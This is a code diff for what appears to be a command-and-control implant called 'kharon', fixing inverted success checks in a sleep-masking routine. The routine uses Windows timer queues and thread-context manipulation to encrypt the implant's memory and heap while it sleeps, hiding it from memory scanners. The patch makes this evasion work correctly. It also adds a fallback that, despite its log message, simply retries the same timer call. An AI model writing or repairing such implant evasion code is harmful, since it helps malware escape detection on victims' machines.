@@ -26,7 +26,15 @@ auto DECLFN Mask::Main(
 
     switch( Self->Config.Mask.Beacon ) {
     case eMask::Timer:
-        Success = this->Timer( RndTime ); break;
+        Success = this->Timer( RndTime );
+
+        if ( ! Success ) {
+            KhDbg( "standard wait failed, falling back to timer technique" );
+            Success = this->Timer( RndTime );
+        }
+
+        break;
+        
     case eMask::None:
         Success = this->Wait( RndTime ); break;
     }
@@ -71,7 +79,11 @@ auto DECLFN Mask::Timer(
         if ( EventStart       ) Self->Ntdll.NtClose( EventStart );
         if ( EventTimer       ) Self->Ntdll.NtClose( EventTimer  );
 
-        return NtStatus;
+        if ( ! NT_SUCCESS( NtStatus ) ) {
+            KhDbg( "memory obfuscation via timer failed: 0x%X", NtStatus );
+        }
+
+        return NT_SUCCESS( NtStatus );
     };
 
     KhDbg( "kharon base at %p [0x%X bytes]", Self->Session.Base.Start, Self->Session.Base.Length );
@@ -88,16 +100,16 @@ auto DECLFN Mask::Timer(
     NtStatus = Self->Ntdll.NtCreateEvent( &EventEnd,    EVENT_ALL_ACCESS, nullptr, NotificationEvent, FALSE );
 
     NtStatus = Self->Ntdll.RtlCreateTimerQueue( &Queue );
-    if ( NT_SUCCESS( NtStatus ) ) return CleanMask();
+    if ( ! NT_SUCCESS( NtStatus ) ) return CleanMask();
 
     NtStatus = Self->Ntdll.RtlCreateTimer( Queue, &Timer, (WAITORTIMERCALLBACKFUNC)Self->Ntdll.RtlCaptureContext, &CtxMain, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
-    if ( NT_SUCCESS( NtStatus ) ) return CleanMask();
+    if ( ! NT_SUCCESS( NtStatus ) ) return CleanMask();
     
     NtStatus = Self->Ntdll.RtlCreateTimer( Queue, &Timer, (WAITORTIMERCALLBACKFUNC)Self->Krnl32.SetEvent, EventTimer, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
-    if ( NT_SUCCESS( NtStatus ) ) return CleanMask();
+    if ( ! NT_SUCCESS( NtStatus ) ) return CleanMask();
 
     NtStatus = Self->Ntdll.NtWaitForSingleObject( EventTimer, FALSE, NULL );
-    if ( NT_SUCCESS( NtStatus ) ) return CleanMask();
+    if ( ! NT_SUCCESS( NtStatus ) ) return CleanMask();
 
     CtxSpf.ContextFlags = CtxBkp.ContextFlags = CONTEXT_ALL;
 
@@ -186,12 +198,14 @@ auto DECLFN Mask::Timer(
     KhDbg( "trigger obf chain" );
 
     NtStatus = Self->Ntdll.NtSignalAndWaitForSingleObject( EventStart, EventEnd, FALSE, nullptr );
-    if ( NT_SUCCESS( NtStatus ) ) return CleanMask();
+    if ( ! NT_SUCCESS( NtStatus ) ) return CleanMask();
 
     if ( Self->Config.Mask.Heap ) {
         KhDbg( "deobfuscating heap allocations from agent" );
         Self->Hp->Crypt();
     }
+
+    return CleanMask();
 }
 
 auto DECLFN Mask::Wait(
